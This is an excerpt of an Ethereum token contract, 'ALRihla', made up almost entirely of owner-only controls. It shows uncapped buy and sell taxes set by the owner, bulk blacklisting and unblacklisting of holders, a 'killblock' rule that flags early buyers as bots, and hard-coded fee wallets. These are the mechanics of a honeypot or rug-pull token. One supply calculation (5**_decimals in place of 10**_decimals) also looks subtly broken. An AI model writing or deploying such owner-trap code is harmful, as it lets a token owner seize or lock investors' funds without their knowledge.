...
contract ALRihla is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x6E784D49f793164007129E171cB10B496C8D8Cc2);
    address payable public liquidityWalletAddress = payable(0x91d888Fb1446EC64bC055c6316dDE1084391180a);
    ...
    uint256 public _walletMax = 60000000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 60000000 * 5 **_decimals; 
    ...
    function setTaxes(uint256 buyingTax, uint256 sellingTax) external onlyOwner {
        _totalTaxIfBuying = buyingTax;
        _totalTaxIfSelling = sellingTax;
    }
    ...
    function writeBlackList(address recipient, bool isBlack) public onlyOwner {
        ...
        //Add blacklist
    function MultiBlackList(address[] memory recipients) public onlyOwner {
        for(uint i=0;i<recipients.length;i++)
            _isBlacklisted[recipients[i]] = true;
    }
    function MultiUnblackList(address[] memory recipients) public onlyOwner {
        for(uint i=0;i<recipients.length;i++)
            _isBlacklisted[recipients[i]] = false;
    }
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if(sender == uniswapPair) {
                    if(launchedBlock + killblock > block.number)
                        addBot(recipient);
                }
            }
